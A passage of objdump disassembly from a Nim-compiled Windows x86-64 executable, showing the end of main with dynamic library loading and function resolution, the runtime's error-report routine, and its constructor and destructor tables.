  409f87:	48 8b 0d 82 0d 02 00 	mov    0x20d82(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409f8e:	48 8d 15 63 25 00 00 	lea    0x2563(%rip),%rdx        # 40c4f8 <.rdata+0x4f8>
  409f95:	48 89 05 64 0d 02 00 	mov    %rax,0x20d64(%rip)        # 42ad00 <Dl_30180001_>
  409f9c:	e8 ce 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fa1:	48 8b 0d 68 0d 02 00 	mov    0x20d68(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409fa8:	48 8d 15 53 25 00 00 	lea    0x2553(%rip),%rdx        # 40c502 <.rdata+0x502>
  409faf:	48 89 05 42 0d 02 00 	mov    %rax,0x20d42(%rip)        # 42acf8 <Dl_30195001_>
  409fb6:	e8 b4 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fbb:	48 8b 0d 4e 0d 02 00 	mov    0x20d4e(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409fc2:	48 8d 15 4b 25 00 00 	lea    0x254b(%rip),%rdx        # 40c514 <.rdata+0x514>
  409fc9:	48 89 05 20 0d 02 00 	mov    %rax,0x20d20(%rip)        # 42acf0 <Dl_32210001_>
  409fd0:	e8 9a 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fd5:	48 8b 0d 34 0d 02 00 	mov    0x20d34(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409fdc:	48 8d 15 40 25 00 00 	lea    0x2540(%rip),%rdx        # 40c523 <.rdata+0x523>
  409fe3:	48 89 05 fe 0c 02 00 	mov    %rax,0x20cfe(%rip)        # 42ace8 <Dl_30890001_>
  409fea:	e8 80 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fef:	48 8d 0d 0a 78 00 00 	lea    0x780a(%rip),%rcx        # 411800 <TM__zjeWotTwb2UTl5yWEPxJRw_4>
  409ff6:	48 89 05 e3 0c 02 00 	mov    %rax,0x20ce3(%rip)        # 42ace0 <Dl_31790001_>
  409ffd:	e8 a9 79 ff ff       	call   4019ab <nimLoadLibrary>
  40a002:	48 8d 0d d7 77 00 00 	lea    0x77d7(%rip),%rcx        # 4117e0 <TM__zjeWotTwb2UTl5yWEPxJRw_5>
  40a009:	48 85 c0             	test   %rax,%rax
  40a00c:	48 89 05 0d 0d 02 00 	mov    %rax,0x20d0d(%rip)        # 42ad20 <TM__zjeWotTwb2UTl5yWEPxJRw_2>
  40a013:	0f 84 1f f1 ff ff    	je     409138 <main+0xb08>
  40a019:	48 8d 15 0f 25 00 00 	lea    0x250f(%rip),%rdx        # 40c52f <.rdata+0x52f>
  40a020:	48 89 c1             	mov    %rax,%rcx
  40a023:	e8 47 7e ff ff       	call   401e6f <nimGetProcAddr>
  40a028:	48 8d 0d 11 78 00 00 	lea    0x7811(%rip),%rcx        # 411840 <TM__VwGJGy8jMvmYmrV9ckorjwQ_4>
  40a02f:	48 89 05 e2 0c 02 00 	mov    %rax,0x20ce2(%rip)        # 42ad18 <Dl_32565001_>
  40a036:	e8 70 79 ff ff       	call   4019ab <nimLoadLibrary>
  40a03b:	48 8d 0d de 77 00 00 	lea    0x77de(%rip),%rcx        # 411820 <TM__VwGJGy8jMvmYmrV9ckorjwQ_5>
  40a042:	48 85 c0             	test   %rax,%rax
  40a045:	48 89 05 e4 0c 02 00 	mov    %rax,0x20ce4(%rip)        # 42ad30 <TM__VwGJGy8jMvmYmrV9ckorjwQ_2>
  40a04c:	0f 84 e6 f0 ff ff    	je     409138 <main+0xb08>
  40a052:	48 8d 15 ea 24 00 00 	lea    0x24ea(%rip),%rdx        # 40c543 <.rdata+0x543>
  40a059:	48 89 c1             	mov    %rax,%rcx
  40a05c:	e8 0e 7e ff ff       	call   401e6f <nimGetProcAddr>
  40a061:	48 8d 0d 18 78 00 00 	lea    0x7818(%rip),%rcx        # 411880 <TM__1MaEGwTuVGZfC1TUC8yTpA_4>
  40a068:	48 89 05 b9 0c 02 00 	mov    %rax,0x20cb9(%rip)        # 42ad28 <Dl_32995001_>
  40a06f:	e8 37 79 ff ff       	call   4019ab <nimLoadLibrary>
  40a074:	48 8d 0d e5 77 00 00 	lea    0x77e5(%rip),%rcx        # 411860 <TM__1MaEGwTuVGZfC1TUC8yTpA_5>
  40a07b:	48 85 c0             	test   %rax,%rax
  40a07e:	48 89 05 cb 0c 02 00 	mov    %rax,0x20ccb(%rip)        # 42ad50 <TM__1MaEGwTuVGZfC1TUC8yTpA_2>
  40a085:	0f 84 ad f0 ff ff    	je     409138 <main+0xb08>
  40a08b:	48 8d 15 bd 24 00 00 	lea    0x24bd(%rip),%rdx        # 40c54f <.rdata+0x54f>
  40a092:	48 89 c1             	mov    %rax,%rcx
  40a095:	e8 d5 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a09a:	48 8b 0d af 0c 02 00 	mov    0x20caf(%rip),%rcx        # 42ad50 <TM__1MaEGwTuVGZfC1TUC8yTpA_2>
  40a0a1:	48 8d 15 b5 24 00 00 	lea    0x24b5(%rip),%rdx        # 40c55d <.rdata+0x55d>
  40a0a8:	48 89 05 99 0c 02 00 	mov    %rax,0x20c99(%rip)        # 42ad48 <Dl_33470001_>
  40a0af:	e8 bb 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a0b4:	48 8b 0d 95 0c 02 00 	mov    0x20c95(%rip),%rcx        # 42ad50 <TM__1MaEGwTuVGZfC1TUC8yTpA_2>
  40a0bb:	48 8d 15 aa 24 00 00 	lea    0x24aa(%rip),%rdx        # 40c56c <.rdata+0x56c>
  40a0c2:	48 89 05 77 0c 02 00 	mov    %rax,0x20c77(%rip)        # 42ad40 <Dl_33565001_>
  40a0c9:	e8 a1 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a0ce:	48 8d 0d eb 77 00 00 	lea    0x77eb(%rip),%rcx        # 4118c0 <TM__FQe4XyEc6FvCCYlu9cDmHHQ_4>
  40a0d5:	48 89 05 5c 0c 02 00 	mov    %rax,0x20c5c(%rip)        # 42ad38 <Dl_33290001_>
  40a0dc:	e8 ca 78 ff ff       	call   4019ab <nimLoadLibrary>
  40a0e1:	48 8d 0d b8 77 00 00 	lea    0x77b8(%rip),%rcx        # 4118a0 <TM__FQe4XyEc6FvCCYlu9cDmHHQ_5>
  40a0e8:	48 85 c0             	test   %rax,%rax
  40a0eb:	48 89 05 6e 0c 02 00 	mov    %rax,0x20c6e(%rip)        # 42ad60 <TM__FQe4XyEc6FvCCYlu9cDmHHQ_2>
  40a0f2:	0f 84 40 f0 ff ff    	je     409138 <main+0xb08>
  40a0f8:	48 8d 15 79 24 00 00 	lea    0x2479(%rip),%rdx        # 40c578 <.rdata+0x578>
  40a0ff:	48 89 c1             	mov    %rax,%rcx
  40a102:	e8 68 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a107:	48 89 05 4a 0c 02 00 	mov    %rax,0x20c4a(%rip)        # 42ad58 <Dl_61320001_>
  40a10e:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  40a113:	ff d0                	call   *%rax
  40a115:	48 8d 05 21 be ff ff 	lea    -0x41df(%rip),%rax        # 405f3d <NimMainInner>
  40a11c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  40a121:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40a126:	e8 aa 7b ff ff       	call   401cd5 <nimGC_setStackBottom>
  40a12b:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  40a130:	ff d0                	call   *%rax
  40a132:	31 c0                	xor    %eax,%eax
  40a134:	48 83 c4 38          	add    $0x38,%rsp
  40a138:	5b                   	pop    %rbx
  40a139:	5e                   	pop    %rsi
  40a13a:	5f                   	pop    %rdi
  40a13b:	5d                   	pop    %rbp
  40a13c:	41 5c                	pop    %r12
  40a13e:	41 5d                	pop    %r13
  40a140:	41 5e                	pop    %r14
  40a142:	41 5f                	pop    %r15
  40a144:	c3                   	ret
  40a145:	90                   	nop
  40a146:	90                   	nop
  40a147:	90                   	nop
  40a148:	90                   	nop
  40a149:	90                   	nop
  40a14a:	90                   	nop
  40a14b:	90                   	nop
  40a14c:	90                   	nop
  40a14d:	90                   	nop
  40a14e:	90                   	nop
  40a14f:	90                   	nop

000000000040a150 <__report_error>:
  40a150:	56                   	push   %rsi
  40a151:	53                   	push   %rbx
  40a152:	48 83 ec 38          	sub    $0x38,%rsp
  40a156:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  40a15b:	48 89 cb             	mov    %rcx,%rbx
  40a15e:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a163:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  40a168:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  40a16d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  40a172:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40a177:	e8 24 e3 ff ff       	call   4084a0 <__acrt_iob_func>
  40a17c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
  40a182:	ba 01 00 00 00       	mov    $0x1,%edx
  40a187:	48 8d 0d b2 79 00 00 	lea    0x79b2(%rip),%rcx        # 411b40 <.rdata>
  40a18e:	49 89 c1             	mov    %rax,%r9
  40a191:	e8 6a e2 ff ff       	call   408400 <fwrite>
  40a196:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  40a19b:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a1a0:	e8 fb e2 ff ff       	call   4084a0 <__acrt_iob_func>
  40a1a5:	48 89 da             	mov    %rbx,%rdx
  40a1a8:	48 89 c1             	mov    %rax,%rcx
  40a1ab:	49 89 f0             	mov    %rsi,%r8
  40a1ae:	e8 15 e2 ff ff       	call   4083c8 <vfprintf>
  40a1b3:	e8 78 e2 ff ff       	call   408430 <abort>
  40a1b8:	90                   	nop
  40a1b9:	90                   	nop
  40a1ba:	90                   	nop
  40a1bb:	90                   	nop
  40a1bc:	90                   	nop
  40a1bd:	90                   	nop
  40a1be:	90                   	nop
  40a1bf:	90                   	nop

000000000040a1c0 <register_frame_ctor>:
  40a1c0:	e9 6b 73 ff ff       	jmp    401530 <__gcc_register_frame>
  40a1c5:	90                   	nop
  40a1c6:	90                   	nop
  40a1c7:	90                   	nop
  40a1c8:	90                   	nop
  40a1c9:	90                   	nop
  40a1ca:	90                   	nop
  40a1cb:	90                   	nop
  40a1cc:	90                   	nop
  40a1cd:	90                   	nop
  40a1ce:	90                   	nop
  40a1cf:	90                   	nop

000000000040a1d0 <__CTOR_LIST__>:
  40a1d0:	ff                   	(bad)
  40a1d1:	ff                   	(bad)
  40a1d2:	ff                   	(bad)
  40a1d3:	ff                   	(bad)
  40a1d4:	ff                   	(bad)
  40a1d5:	ff                   	(bad)
  40a1d6:	ff                   	(bad)
  40a1d7:	ff                   	.byte 0xff

000000000040a1d8 <.ctors.65535>:
  40a1d8:	c0 a1 40 00 00 00 00 	shlb   $0x0,0x40(%rcx)
	...

000000000040a1e8 <__DTOR_LIST__>:
  40a1e8:	ff                   	(bad)
  40a1e9:	ff                   	(bad)
  40a1ea:	ff                   	(bad)
  40a1eb:	ff                   	(bad)
  40a1ec:	ff                   	(bad)
  40a1ed:	ff                   	(bad)
  40a1ee:	ff                   	(bad)
  40a1ef:	ff 00                	incl   (%rax)
  40a1f1:	00 00                	add    %al,(%rax)
  40a1f3:	00 00                	add    %al,(%rax)
  40a1f5:	00 00                	add    %al,(%rax)
	...
